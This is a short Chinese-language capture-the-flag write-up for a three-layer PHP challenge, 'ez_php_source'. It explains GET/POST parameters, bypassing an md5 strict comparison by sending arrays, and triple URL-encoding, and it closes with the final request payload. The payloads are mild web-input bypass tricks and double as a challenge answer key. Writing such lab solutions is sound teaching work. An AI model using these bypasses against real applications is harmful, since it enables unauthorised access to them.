## ez_php_source

简单的php套娃判断，题目一共三层

第一层考点：

学会简单的get和post传参

```
get:   ?b=408
post:  a=405
```

第二层考点：

需要知道php中md5强比较的绕过,使用数组会导致md5返回null，学会简单查点资料

```
post:  c[]=1&d[]=2
```

第三层考点：

get传参的特殊性，会事先对参数进行一次解码，所以需要一共三次url编码

```
get:   last2=TheBestLanguage%25253D%25253D%25253D%25253DPHP
post:  last1=TheBestLanguage====PHP
```

最终payload：

```
get:   ?b=408&last2=TheBestLanguage%25253D%25253D%25253D%25253DPHP
post:  a=405&c[]=1&d[]=2&last1=TheBestLanguage====PHP
```
